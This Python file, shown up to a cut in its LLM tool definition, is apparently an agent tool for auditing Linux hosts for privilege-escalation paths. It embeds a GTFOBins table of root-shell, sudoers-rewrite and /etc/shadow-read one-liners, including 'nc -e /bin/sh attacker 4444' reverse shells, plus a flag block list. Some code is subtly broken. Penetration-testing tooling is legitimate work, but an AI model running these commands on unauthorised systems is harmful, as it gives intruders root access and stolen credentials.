import subprocess
import json
import re
import time
import os
from typing import Optional, Any
from pydantic import BaseModel, Field, validator


# ══════════════════════════════════════════════════════════════
# 1. SCHEMAS
# ══════════════════════════════════════════════════════════════

class PrivescAuditRequest(BaseModel):
    tool: str
    mode: str
    args: list[str] = []
    timeout: int = Field(default=300, ge=30, le=3600)

    @validator("tool")
    def validate_tool(cls, v):
        allowed = {"linpeas", "linux-exploit-suggester", "pspy", "manual"}
        if v not in allowed:
            raise ValueError(f"Tool '{v}' not allowed. Use: {allowed}")
        return v

    @validator("mode")
    def validate_mode(cls, v):
        allowed_modes = {
            # linpeas modes
            "full_audit",           # full linpeas run — all checks
            "suid_sgid",            # SUID/SGID binaries
            "sudo_misconfig",       # sudo -l + sudoers misconfigs
            "cron_jobs",            # cron jobs + writable cron paths
            "writable_paths",       # world-writable files/dirs/scripts
            "capabilities",         # linux capabilities (cap_setuid etc.)
            "kernel_exploits",      # kernel version → CVE suggestions
            "docker_lxc",           # docker group, lxc, container escape
            "network_info",         # interfaces, open ports, hosts
            "password_files",       # /etc/passwd, shadow, .ssh, history
            # linux-exploit-suggester modes
            "les_kernel",           # kernel CVE matching
            "les_extended",         # extended userspace checks
            # pspy modes
            "pspy_procs",           # passive process spy (no root needed)
            "pspy_cron",            # spy specifically for cron triggers
            # manual audit modes (built-in, no external tool)
            "manual_suid",          # find / -perm -4000 (manual)
            "manual_caps",          # getcap -r / (manual)
            "manual_writable",      # find / -writable (manual)
            "manual_cron",          # cat all crontabs (manual)
            "manual_sudo",          # sudo -l (manual)
            "manual_docker",        # id + docker group check (manual)
            "manual_env",           # env + path hijack candidates
        }
        if v not in allowed_modes:
            raise ValueError(f"Mode '{v}' not allowed. Use: {allowed_modes}")
        return v

    @validator("args")
    def validate_args(cls, v):
        """Block shell injection ONLY — preserve all tool features"""
        dangerous_chars = [";", "&&", "||", "|", "`", "$(", ">>", "'", '"']
        blocked_flags   = ["--upload", "--reverse-shell", "--exploit"]  # no auto-exploitation

        for arg in v:
            for char in dangerous_chars:
                if char in arg:
                    raise ValueError(f"Dangerous character '{char}' in: {arg}")
            for flag in blocked_flags:
                if arg.strip() == flag:
                    raise ValueError(f"Blocked flag: {arg}")
        return v


# ── SUID / SGID Binary ──
class SUIDResult(BaseModel):
    path: str
    permissions: Optional[str] = None
    owner: Optional[str] = None
    group: Optional[str] = None
    gtfobins: Optional[bool] = None        # known GTFOBins entry
    exploit_note: Optional[str] = None


# ── Sudo Rule ──
class SudoResult(BaseModel):
    user: Optional[str] = None
    host: Optional[str] = None
    runas: Optional[str] = None
    command: str
    nopasswd: bool = False
    gtfobins: Optional[bool] = None
    exploit_note: Optional[str] = None


# ── Cron Job ──
class CronResult(BaseModel):
    schedule: Optional[str] = None
    user: Optional[str] = None
    command: str
    source: Optional[str] = None          # /etc/crontab, /var/spool/cron/*, cron.d/*
    writable: Optional[bool] = None       # can we write to this script?
    exploit_note: Optional[str] = None


# ── Writable Path ──
class WritableResult(BaseModel):
    path: str
    permissions: Optional[str] = None
    owner: Optional[str] = None
    path_type: Optional[str] = None       # file, dir, script, suid_dir
    exploit_note: Optional[str] = None


# ── Linux Capability ──
class CapabilityResult(BaseModel):
    path: str
    capabilities: str
    exploit_note: Optional[str] = None


# ── Kernel Exploit Suggestion ──
class KernelExploitResult(BaseModel):
    cve: Optional[str] = None
    name: Optional[str] = None
    severity: Optional[str] = None
    kernel_version: Optional[str] = None
    url: Optional[str] = None
    notes: Optional[str] = None


# ── Docker / Container Finding ──
class ContainerResult(BaseModel):
    finding: str
    detail: Optional[str] = None
    exploit_note: Optional[str] = None


# ── Process Spy Entry (pspy) ──
class ProcessResult(BaseModel):
    uid: Optional[str] = None
    pid: Optional[str] = None
    command: str
    timestamp: Optional[str] = None
    triggered_by: Optional[str] = None    # cron, user, daemon


# ── Final Result ──
class PrivescAuditResult(BaseModel):
    success: bool
    tool: str
    mode: str
    command: str
    hostname: Optional[str] = None
    kernel_version: Optional[str] = None
    current_user: Optional[str] = None
    suid_bins: list[SUIDResult] = []
    sudo_rules: list[SudoResult] = []
    cron_jobs: list[CronResult] = []
    writable_paths: list[WritableResult] = []
    capabilities: list[CapabilityResult] = []
    kernel_exploits: list[KernelExploitResult] = []
    container_findings: list[ContainerResult] = []
    processes: list[ProcessResult] = []
    raw_output: Optional[str] = None
    error: Optional[str] = None
    execution_time: float = 0.0


# ══════════════════════════════════════════════════════════════
# 2. GTFOBINS REFERENCE  (offline — no network needed)
# ══════════════════════════════════════════════════════════════

# Common GTFOBins with privesc notes
GTFOBINS: dict[str, str] = {
    "bash":       "sudo bash → root shell",
    "sh":         "sudo sh → root shell",
    "python":     "sudo python -c 'import os; os.system(\"/bin/sh\")'",
    "python2":    "sudo python2 -c 'import os; os.system(\"/bin/sh\")'",
    "python3":    "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
    "perl":       "sudo perl -e 'exec \"/bin/sh\";'",
    "ruby":       "sudo ruby -e 'exec \"/bin/sh\"'",
    "php":        "sudo php -r 'system(\"/bin/sh\");'",
    "lua":        "sudo lua -e 'os.execute(\"/bin/sh\")'",
    "awk":        "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
    "nmap":       "sudo nmap --interactive → !sh  (older versions)",
    "vim":        "sudo vim -c ':!/bin/sh'",
    "vi":         "sudo vi -c ':!/bin/sh'",
    "nano":       "sudo nano → ^R^X → reset; sh 1>&0 2>&0",
    "less":       "sudo less /etc/passwd → !sh",
    "more":       "sudo more /etc/passwd → !sh",
    "man":        "sudo man man → !sh",
    "find":       "sudo find . -exec /bin/sh \\; -quit",
    "tee":        "echo 'ALL ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/pwned",
    "cp":         "sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash",
    "mv":         "overwrite sensitive files (e.g. /etc/passwd)",
    "cat":        "read /etc/shadow via SUID cat",
    "tail":       "read /etc/shadow via SUID tail",
    "head":       "read /etc/shadow via SUID head",
    "cut":        "read /etc/shadow via SUID cut",
    "sort":       "read /etc/shadow via SUID sort",
    "base64":     "base64 /etc/shadow | base64 --decode",
    "xxd":        "xxd /etc/shadow | xxd -r",
    "tar":        "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "zip":        "sudo zip /tmp/x.zip /tmp/x -T --unzip-command='sh -c /bin/sh'",
    "unzip":      "sudo unzip -K /tmp/x.zip -d /tmp/",
    "curl":       "sudo curl file:///etc/shadow",
    "wget":       "sudo wget file:///etc/shadow",
    "ftp":        "sudo ftp → ! /bin/sh",
    "ssh":        "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
    "git":        "sudo git -p help → !sh",
    "gcc":        "sudo gcc -wrapper /bin/sh,-s",
    "make":       "sudo make -s --eval=$'x:\\n\\t-'\"'\"'exec /bin/sh'\"'\"",
    "env":        "sudo env /bin/sh",
    "strace":     "sudo strace -o /dev/null /bin/sh",
    "ltrace":     "sudo ltrace -b -L /bin/sh",
    "time":       "sudo time /bin/sh",
    "watch":      "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
    "taskset":    "sudo taskset 1 /bin/sh",
    "nice":       "sudo nice /bin/sh",
    "ionice":     "sudo ionice /bin/sh",
    "setarch":    "sudo setarch $(arch) /bin/sh",
    "systemctl":  "sudo systemctl → write unit file → ExecStart=/bin/bash",
    "journalctl": "sudo journalctl → !sh",
    "mount":      "sudo mount -o bind /bin/bash /bin/sh",
    "umount":     "sudo umount -l /mnt → triggers unmount hooks",
    "chmod":      "sudo chmod +s /bin/bash → /bin/bash -p",
    "chown":      "sudo chown root:root /bin/bash && chmod +s /bin/bash",
    "dd":         "sudo dd if=/etc/shadow",
    "od":         "od -c /etc/shadow",
    "hexdump":    "hexdump -C /etc/shadow",
    "screen":     "sudo screen -x root/",
    "tmux":       "sudo tmux -S /tmp/s new-session -d; sudo tmux -S /tmp/s",
    "socat":      "sudo socat stdin exec:/bin/sh",
    "nc":         "sudo nc -e /bin/sh attacker 4444",
    "netcat":     "sudo nc -e /bin/sh attacker 4444",
    "ncat":       "sudo ncat -e /bin/sh attacker 4444",
    "docker":     "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "lxc":        "lxc init ubuntu:16.04 privesc -c security.privileged=true",
    "newgrp":     "sudo newgrp root",
    "su":         "sudo su → root",
    "passwd":     "SUID passwd → overwrite /etc/passwd",
    "pkexec":     "CVE-2021-4034 (Pwnkit) — affects all polkit versions < 0.120",
    "node":       "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'",
    "npm":        "sudo npm run env --",
    "pip":        "sudo pip install --upgrade . (malicious setup.py)",
    "pip3":       "sudo pip3 install --upgrade . (malicious setup.py)",
    "ruby":       "sudo ruby -e 'exec \"/bin/sh\"'",
    "irb":        "sudo irb → exec '/bin/sh'",
    "knife":      "sudo knife exec -E 'exec \"/bin/sh\"'",
    "mysql":      "sudo mysql -e '\\! /bin/sh'",
    "sqlite3":    "sudo sqlite3 /dev/null '.shell /bin/sh'",
    "psql":       "sudo psql -c '\\! /bin/sh'",
    "tclsh":      "sudo tclsh → exec /bin/sh",
    "expect":     "sudo expect -c 'spawn /bin/sh;interact'",
    "capsh":      "sudo capsh --print",
    "openssl":    "sudo openssl req -newkey rsa:4096 -subj / -passout pass: -out /dev/null 2>&1",
    "rsync":      "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
    "scp":        "sudo scp -S /tmp/evil.sh x y:",
    "xargs":      "sudo xargs -a /dev/null sh",
    "tee":        "echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers",
    "bash":       "SUID bash: /bin/bash -p → root",
    "dash":       "SUID dash: /bin/dash -p → root",
    "zsh":        "SUID zsh: /bin/zsh → root",
    "ksh":        "SUID ksh → root shell",
    "csh":        "SUID csh → root shell",
    "tcsh":       "SUID tcsh → root shell",
}

# Capability → privesc mapping
DANGEROUS_CAPS: dict[str, str] = {
    "cap_setuid":     "Set UID to 0 → instant root (e.g. python3 cap_setuid → os.setuid(0))",
    "cap_setgid":     "Set GID to 0 → root group",
    "cap_sys_admin":  "Broad admin capability — mount, ioctl, container escape",
    "cap_sys_ptrace": "ptrace any process → inject shellcode into root process",
    "cap_dac_override": "Bypass DAC — read/write any file (e.g. /etc/shadow)",
    "cap_dac_read_search": "Read any file/dir → read /etc/shadow",
    "cap_chown":      "chown any file → chown /etc/shadow",
    "cap_fowner":     "Bypass owner permission checks",
    "cap_net_raw":    "Raw sockets → ARP/ICMP spoofing",
    "cap_net_bind_service": "Bind ports < 1024",
    "cap_sys_rawio":  "Raw I/O — read kernel memory",
    "cap_sys_module": "Load kernel modules → rootkit",
    "cap_audit_write": "Write audit log → log tampering",
    "cap_kill":       "Send signals to any process",
    "cap_mknod":      "Create device files",
    "cap_sys_chroot": "chroot to arbitrary path",
    "cap_sys_boot":   "Reboot / load new kernel",
    "cap_ipc_lock":   "Lock memory pages",
    "cap_linux_immutable": "Set/clear immutable flag",
}


def check_gtfobins(binary_name: str) -> tuple[bool, Optional[str]]:
    name = os.path.basename(binary_name).lower()
    if name in GTFOBINS:
        return True, GTFOBINS[name]
    return False, None


def check_caps(cap_string: str) -> Optional[str]:
    notes = []
    for cap, note in DANGEROUS_CAPS.items():
        if cap in cap_string.lower():
            notes.append(f"{cap}: {note}")
    return " | ".join(notes) if notes else None


# ══════════════════════════════════════════════════════════════
# 3. PARSERS
# ══════════════════════════════════════════════════════════════

def parse_linpeas(stdout: str) -> PrivescAuditResult:
    """
    Parse linpeas.sh output.

    linpeas uses ANSI color codes for severity:
      RED/YELLOW  = high interest
      GREEN       = interesting
      Plain text  = informational

    We strip ANSI and extract sections by header markers.
    """
    # Strip ANSI escape codes
    ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
    clean = ansi_escape.sub("", stdout)

    result = PrivescAuditResult(
        success=True, tool="linpeas", mode="", command=""
    )

    # ── Kernel / host info ──
    kernel_match = re.search(r"Linux version\s+(\S+)", clean)
    if kernel_match:
        result.kernel_version = kernel_match.group(1)

    host_match = re.search(r"Hostname:\s*(\S+)", clean, re.IGNORECASE)
    if host_match:
        result.hostname = host_match.group(1)

    user_match = re.search(r"Current user:\s*(\S+)", clean, re.IGNORECASE)
    if not user_match:
        user_match = re.search(r"whoami.*?\n(\S+)", clean)
    if user_match:
        result.current_user = user_match.group(1)

    # ── SUID / SGID ──
    suid_section = re.search(
        r"SUID.*?binaries(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
    )
    if suid_section:
        for m in re.finditer(r"(/\S+)", suid_section.group(1)):
            path = m.group(1)
            gtf, note = check_gtfobins(path)
            result.suid_bins.append(SUIDResult(
                path=path,
                gtfobins=gtf,
                exploit_note=note,
            ))

    # Fallback: find -perm -4000 style lines
    for m in re.finditer(r"-rws\S*\s+\S+\s+\S+\s+(/\S+)", clean):
        path = m.group(1)
        if not any(s.path == path for s in result.suid_bins):
            gtf, note = check_gtfobins(path)
            result.suid_bins.append(SUIDResult(path=path, gtfobins=gtf, exploit_note=note))

    # ── Sudo rules ──
    sudo_section = re.search(
        r"Sudo version.*?sudo -l(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
    )
    raw_sudo = sudo_section.group(1) if sudo_section else clean
    for m in re.finditer(
        r"\((\S+)\)\s*(NOPASSWD:\s*)?(/\S+|\bALL\b)", raw_sudo
    ):
        cmd = m.group(3).strip()
        nopasswd = bool(m.group(2))
        gtf, note = check_gtfobins(cmd)
        result.sudo_rules.append(SudoResult(
            runas=m.group(1),
            command=cmd,
            nopasswd=nopasswd,
            gtfobins=gtf,
            exploit_note=note,
        ))

    # ── Cron jobs ──
    cron_section = re.search(
        r"Cron jobs(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
    )
    if cron_section:
        for m in re.finditer(
            r"(\*[/\d\*\s,\-]+|@\w+)\s+(\w+)\s+(/.+?)(?:\n|$)",
            cron_section.group(1)
        ):
            result.cron_jobs.append(CronResult(
                schedule=m.group(1).strip(),
                user=m.group(2),
                command=m.group(3).strip(),
            ))

    # ── Writable paths ──
    writable_section = re.search(
        r"Writable.*?files(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
    )
    if writable_section:
        for m in re.finditer(r"(/\S+)", writable_section.group(1)):
            result.writable_paths.append(WritableResult(path=m.group(1)))

    # ── Capabilities ──
    cap_section = re.search(
        r"Capabilities(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
    )
    if cap_section:
        for m in re.finditer(r"(/\S+)\s+=\s+(\S+)", cap_section.group(1)):
            note = check_caps(m.group(2))
            result.capabilities.append(CapabilityResult(
                path=m.group(1),
                capabilities=m.group(2),
                exploit_note=note,
            ))

    # ── Docker / container ──
    if re.search(r"docker", clean, re.IGNORECASE):
        docker_matches = re.findall(r"(docker[^\n]+)", clean, re.IGNORECASE)
        for dm in docker_matches[:10]:
            dm = dm.strip()
            if dm:
                result.container_findings.append(ContainerResult(
                    finding=dm,
                    exploit_note=GTFOBINS.get("docker") if "group" in dm.lower() else None,
                ))

    return result


def parse_les(stdout: str) -> list[KernelExploitResult]:
    """
    Parse linux-exploit-suggester output.

    LES outputs sections like:
      [+] [CVE-2021-4034] PwnKit
          Details: https://...
          Tags: ...
    """
    exploits: list[KernelExploitResult] = []
    ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
    clean = ansi_escape.sub("", stdout)

    # Match CVE blocks
    cve_pattern = re.compile(
        r"\[\+\]\s+\[?(CVE-[\d\-]+)\]?\s+(.+?)\n"
        r"(?:.*?Details:\s*(https?://\S+))?"
        r"(?:.*?Tags:\s*(.+?))?(?=\[\+\]|\Z)",
        re.DOTALL
    )
    for m in cve_pattern.finditer(clean):
        cve   = m.group(1).strip()
        name  = m.group(2).strip()
        url   = m.group(3).strip() if m.group(3) else None
        tags  = m.group(4).strip() if m.group(4) else None

        # Rough severity from name keywords
        severity = "medium"
        high_keywords = ["root", "privesc", "priv esc", "privilege", "lpe", "pwnkit",
                         "dirty", "rds", "overlayfs", "namespace"]
        if any(kw in name.lower() or (tags and kw in tags.lower()) for kw in high_keywords):
            severity = "high"

        exploits.append(KernelExploitResult(
            cve=cve,
            name=name,
            severity=severity,
            url=url,
            notes=tags,
        ))

    # Also parse plain "Possible Exploits" section
    if not exploits:
        for m in re.finditer(r"\[\+\]\s+(.+?)(?:\n|$)", clean):
            entry = m.group(1).strip()
            if entry:
                cve_inline = re.search(r"CVE-[\d\-]+", entry)
                exploits.append(KernelExploitResult(
                    cve=cve_inline.group(0) if cve_inline else None,
                    name=entry,
                    severity="medium",
                ))

    return exploits


def parse_pspy(stdout: str) -> list[ProcessResult]:
    """
    Parse pspy output.

    pspy line format:
      2024/01/01 12:00:01 CMD: UID=0    PID=1234   | /usr/sbin/cron -f
    """
    processes: list[ProcessResult] = []
    ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
    clean = ansi_escape.sub("", stdout)

    pspy_pattern = re.compile(
        r"(\d{4}/\d{2}/\d{2}\s+\d{2}:\d{2}:\d{2})\s+"
        r"CMD:\s+UID=(\d+)\s+PID=(\d+)\s+\|\s+(.+)"
    )
    for m in pspy_pattern.finditer(clean):
        timestamp = m.group(1)
        uid       = m.group(2)
        pid       = m.group(3)
        cmd       = m.group(4).strip()

        # Detect trigger source
        triggered_by = None
        if "cron" in cmd.lower():
            triggered_by = "cron"
        elif uid == "0":
            triggered_by = "root-daemon"

        processes.append(ProcessResult(
            uid=uid,
            pid=pid,
            command=cmd,
            timestamp=timestamp,
            triggered_by=triggered_by,
        ))

    return processes


def parse_manual(stdout: str, stderr: str, mode: str) -> PrivescAuditResult:
    """
    Parse output from manual built-in commands:
    find / -perm -4000, getcap -r /, sudo -l, etc.
    """
    raw = stdout or stderr
    result = PrivescAuditResult(
        success=bool(raw.strip()),
        tool="manual",
        mode=mode,
        command="",
    )

    if mode == "manual_suid":
        for line in raw.strip().split("\n"):
            line = line.strip()
            if line.startswith("/"):
                perm_match = re.match(r"(-\S+)\s+\d+\s+(\S+)\s+(\S+).*?(/\S+)", line)
                if perm_match:
                    path = perm_match.group(4)
                    gtf, note = check_gtfobins(path)
                    result.suid_bins.append(SUIDResult(
                        path=path,
                        permissions=perm_match.group(1),
                        owner=perm_match.group(2),
                        group=perm_match.group(3),
                        gtfobins=gtf,
                        exploit_note=note,
                    ))
                else:
                    # plain path output
                    gtf, note = check_gtfobins(line)
                    result.suid_bins.append(SUIDResult(
                        path=line,
                        gtfobins=gtf,
                        exploit_note=note,
                    ))

    elif mode == "manual_caps":
        # getcap output: /usr/bin/python3.8 = cap_setuid+eip
        for m in re.finditer(r"(/\S+)\s+=\s+(\S+)", raw):
            note = check_caps(m.group(2))
            result.capabilities.append(CapabilityResult(
                path=m.group(1),
                capabilities=m.group(2),
                exploit_note=note,
            ))

    elif mode == "manual_sudo":
        # sudo -l output
        for m in re.finditer(
            r"\((\S+)\)\s*(NOPASSWD:\s*)?(/\S+|\bALL\b)", raw
        ):
            cmd = m.group(3).strip()
            nopasswd = bool(m.group(2))
            gtf, note = check_gtfobins(cmd)
            result.sudo_rules.append(SudoResult(
                runas=m.group(1),
                command=cmd,
                nopasswd=nopasswd,
                gtfobins=gtf,
                exploit_note=note,
            ))

    elif mode == "manual_cron":
        for m in re.finditer(
            r"(\*[/\d\*\s,\-]+|@\w+)\s+(\w+)?\s*(/\S[^\n]+)", raw
        ):
            result.cron_jobs.append(CronResult(
                schedule=m.group(1).strip(),
                user=m.group(2),
                command=m.group(3).strip(),
            ))

    elif mode == "manual_writable":
        for line in raw.strip().split("\n"):
            line = line.strip()
            if line.startswith("/"):
                result.writable_paths.append(WritableResult(path=line))

    elif mode == "manual_docker":
        result.container_findings.append(ContainerResult(
            finding=raw.strip(),
            exploit_note=GTFOBINS.get("docker") if "docker" in raw.lower() else None,
        ))

    elif mode == "manual_env":
        for line in raw.strip().split("\n"):
            if line.startswith("PATH="):
                dirs = line[5:].split(":")
                for d in dirs:
                    if d in (".", "", "./", ".."):
                        result.writable_paths.append(WritableResult(
                            path=d,
                            path_type="PATH-hijack",
                            exploit_note=f"Relative PATH entry '{d}' allows command hijacking",
                        ))

    return result


# ══════════════════════════════════════════════════════════════
# 4. EXECUTOR
# ══════════════════════════════════════════════════════════════

def safe_execute(cmd: list[str], timeout: int = 300) -> tuple[str, str, int]:
    """Run command safely — no shell, no injection"""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            shell=False,
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", f"Timed out after {timeout}s", -1
    except FileNotFoundError:
        return "", f"Tool '{cmd[0]}' not installed", -1
    except Exception as e:
        return "", str(e), -1


# ── Manual command map ──
MANUAL_COMMANDS: dict[str, list[str]] = {
    "manual_suid":    ["find", "/", "-perm", "-4000", "-type", "f", "-ls", "2>/dev/null"],
    "manual_caps":    ["getcap", "-r", "/"],
    "manual_writable":["find", "/", "-writable", "-not", "-path", "*/proc/*", "-not", "-path", "*/sys/*"],
    "manual_cron":    ["cat", "/etc/crontab"],
    "manual_sudo":    ["sudo", "-l"],
    "manual_docker":  ["id"],
    "manual_env":     ["env"],
}

# For manual_suid we can't use shell redirect 2>/dev/null without shell=True
# We handle stderr suppression via capture_output=True in safe_execute
MANUAL_COMMANDS["manual_suid"] = ["find", "/", "-perm", "-4000", "-type", "f", "-ls"]


# ══════════════════════════════════════════════════════════════
# 5. MAIN TOOL FUNCTION
# ══════════════════════════════════════════════════════════════

def linux_privesc_audit(
    tool: str,
    mode: str,
    args: list[str] = [],
) -> dict:
    """
    🔧 Agent Tool: Linux Privilege Escalation Audit

    Enumerates the local system for privilege escalation vectors:
    SUID/SGID binaries, sudo misconfigs, cron job abuse, writable paths,
    dangerous capabilities, kernel CVEs, docker group escape, process spy.

    Capabilities:
      ┌────────────────────────────────────────────────────────────────────┐
      │  SUID / SGID BINS     linpeas, manual find -perm -4000            │
      │  SUDO MISCONFIG       linpeas, manual sudo -l                     │
      │  CRON ABUSE           linpeas, pspy, manual crontab               │
      │  WRITABLE PATHS       linpeas, manual find -writable              │
      │  CAPABILITIES         linpeas, manual getcap -r /                 │
      │  KERNEL EXPLOITS      linux-exploit-suggester (LES)               │
      │  DOCKER / LXC ESCAPE  linpeas, manual id + group check            │
      │  PROCESS SPY          pspy (no root needed, catches cron/suid)    │
      │  GTFOBINS LOOKUP      offline — auto-annotates every finding       │
      └────────────────────────────────────────────────────────────────────┘

    Args:
        tool:   "linpeas" | "linux-exploit-suggester" | "pspy" | "manual"
        mode:   Operation mode (see below)
        args:   Raw tool arguments — agent decides

    ── linpeas modes ────────────────────────────────────────────────────
        "full_audit"       → linpeas.sh (all checks)
                             args: ["-a"]            extended checks
                                   ["-s"]            super fast (skip heavy checks)
                                   ["-P", "password"] check with known password

        "suid_sgid"        → linpeas.sh -o SuidBins
        "sudo_misconfig"   → linpeas.sh -o Sudo
        "cron_jobs"        → linpeas.sh -o CronJobs
        "writable_paths"   → linpeas.sh -o WritableFiles
        "capabilities"     → linpeas.sh -o Capabilities
        "kernel_exploits"  → linpeas.sh -o KernelExploits
        "docker_lxc"       → linpeas.sh -o DockerFiles
        "network_info"     → linpeas.sh -o NetInfo
        "password_files"   → linpeas.sh -o PasswordsFiles

    ── linux-exploit-suggester modes ────────────────────────────────────
        "les_kernel"       → linux-exploit-suggester.sh
                             args: ["--kernelspace-only"]
                                   ["--kernel", "5.4.0"]   specify kernel manually

        "les_extended"     → linux-exploit-suggester.sh
                             args: ["--userspace"]          include userspace CVEs
                                   ["--pkglist-file", "/tmp/pkgs.txt"]

    ── pspy modes ───────────────────────────────────────────────────────
        "pspy_procs"       → pspy (watch all processes for N seconds)
                             args: ["-p"]             print commands to stdout
                                   ["-i", "1000"]     poll interval ms
                                   ["-f"]             also watch filesystem events

        "pspy_cron"        → pspy (focused: watch for UID=0 cron triggers)
                             args: ["-i", "500", "-p"]

    ── manual modes (no external tool — pure system commands) ───────────
        "manual_suid"      → find / -perm -4000 -type f -ls
        "manual_caps"      → getcap -r /
        "manual_writable"  → find / -writable (excl. /proc /sys)
        "manual_cron"      → cat /etc/crontab + /var/spool/cron
        "manual_sudo"      → sudo -l
        "manual_docker"    → id (check docker/lxd group membership)
        "manual_env"       → env (PATH hijack detection)

    Returns:
        Structured JSON: suid_bins → sudo_rules → cron_jobs → writable_paths →
                         capabilities → kernel_exploits → container_findings →
                         processes (each auto-annotated with GTFOBins notes)
    """

    start = time.time()

    # ══════════════════════════════
    # VALIDATE
    # ══════════════════════════════
    try:
        req = PrivescAuditRequest(tool=tool, mode=mode, args=args)
    except Exception as e:
        return PrivescAuditResult(
            success=False, tool=tool, mode=mode,
            command="", error=f"Validation: {e}"
        ).model_dump()

    # ══════════════════════════════
    # BUILD COMMAND
    # ══════════════════════════════
    cmd: list[str] = []

    # ── linpeas ──
    if tool == "linpeas":
        linpeas_bin = "/tmp/linpeas.sh"

        LINPEAS_SECTION_FLAGS: dict[str, str] = {
            "suid_sgid":      "SuidBins",
            "sudo_misconfig": "Sudo",
            "cron_jobs":      "CronJobs",
            "writable_paths": "WritableFiles",
            "capabilities":   "Capabilities",
            "kernel_exploits":"KernelExploits",
            "docker_lxc":     "DockerFiles",
            "network_info":   "NetInfo",
            "password_files": "PasswordsFiles",
        }

        if mode == "full_audit":
            cmd = ["bash", linpeas_bin] + list(req.args)
        elif mode in LINPEAS_SECTION_FLAGS:
            section = LINPEAS_SECTION_FLAGS[mode]
            cmd = ["bash", linpeas_bin, "-o", section] + list(req.args)
        else:
            cmd = ["bash", linpeas_bin] + list(req.args)

    # ── linux-exploit-suggester ──
    elif tool == "linux-exploit-suggester":
        les_bin = "/tmp/linux-exploit-suggester.sh"
        cmd = ["bash", les_bin] + list(req.args)

    # ── pspy ──
    elif tool == "pspy":
        pspy_bin = "/tmp/pspy64"

        if mode == "pspy_cron":
            base_args = ["-i", "500", "-p"]
        else:
            base_args = ["-p", "-i", "1000"]

        # Agent overrides take priority
        final_args = list(req.args) if req.args else base_args
        cmd = [pspy_bin] + final_args

    # ── manual ──
    elif tool == "manual":
        if mode in MANUAL_COMMANDS:
            cmd = MANUAL_COMMANDS[mode] + list(req.args)
        elif mode == "manual_cron":
            # Read multiple cron sources — run as a sequence
            cmd = ["bash", "-c",
                   "cat /etc/crontab 2>/dev/null; "
                   "ls /etc/cron.d/ 2>/dev/null; "
                   "cat /var/spool/cron/crontabs/* 2>/dev/null"]
        else:
            return PrivescAuditResult(
                success=False, tool=tool, mode=mode,
                command="", error=f"Unknown manual mode: {mode}"
            ).model_dump()
    else:
        return PrivescAuditResult(
            success=False, tool=tool, mode=mode,
            command="", error=f"Unknown tool: {tool}"
        ).model_dump()

    # ══════════════════════════════
    # EXECUTE
    # ══════════════════════════════
    command_str = " ".join(cmd)
    stdout, stderr, rc = safe_execute(cmd, req.timeout)

    # ══════════════════════════════
    # PARSE
    # ══════════════════════════════
    result: PrivescAuditResult

    if tool == "linpeas":
        result = parse_linpeas(stdout or stderr)
        result.mode    = mode
        result.command = command_str

    elif tool == "linux-exploit-suggester":
        exploits = parse_les(stdout or stderr)
        result = PrivescAuditResult(
            success=len(exploits) > 0 or rc == 0,
            tool=tool, mode=mode, command=command_str,
            kernel_exploits=exploits,
        )

    elif tool == "pspy":
        procs = parse_pspy(stdout or stderr)
        result = PrivescAuditResult(
            success=len(procs) > 0 or rc == 0,
            tool=tool, mode=mode, command=command_str,
            processes=procs,
        )

    elif tool == "manual":
        result = parse_manual(stdout, stderr, mode)
        result.tool    = tool
        result.mode    = mode
        result.command = command_str

    else:
        result = PrivescAuditResult(
            success=False, tool=tool, mode=mode,
            command=command_str, error=f"Unknown tool: {tool}"
        )

    # ── Attach raw output + timing ──
    result.raw_output      = (stdout or stderr)[:5000]
    result.error           = stderr[:1000] if rc != 0 and not result.suid_bins \
                             and not result.sudo_rules and not result.kernel_exploits \
                             and not result.capabilities and not result.processes else None
    result.execution_time  = round(time.time() - start, 2)
    result.success         = result.success if result.error is None else False

    return result.model_dump()


# ══════════════════════════════════════════════════════════════
# 6. TOOL DEFINITION (for LLM)
# ══════════════════════════════════════════════════════════════

LINUX_PRIVESC_AUDIT_TOOL_DEFINITION = {
    "name": "linux_privesc_audit",
    "description": (
        "Audit a Linux system for privilege escalation vectors: "
        "SUID/SGID binaries, sudo misconfigs, cron job abuse, writable paths, "
        "dangerous capabilities, kernel CVEs, docker/lxc group escapes, and process spying. "
        "Every finding is auto-annotated with GTFOBins exploitation notes. "
        "Supports linpeas (full enum), linux-exploit-suggester (kernel CVEs), "
        "pspy (passive process spy), and manual built-in commands. "
        "YOU decide the mode and args."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "tool": {
                "type": "string",
                "enum": ["linpeas", "linux-exploit-suggester", "pspy", "manual"],
                "description": (
                    "linpeas                 = full local privilege escalation enumeration |\n"
                    "linux-exploit-suggester = kernel CVE matching (LES) |\n"
                    "pspy                    = passive process spy, no root needed |\n"
                    "manual                  = built-in system commands, no external tool"
                ),
            },
            "mode": {
                "type": "string",
                "enum": [
                    "full_audit",
                    "suid_sgid", "sudo_misconfig", "cron_jobs",
                    "writable_paths", "capabilities", "kernel_exploits",
                    "docker_lxc", "network_info", "password_files",
                    "les_kernel", "les_extended",
                    "pspy_procs", "pspy_cron",
                    "manual_suid", "manual_caps", "manual_writable",
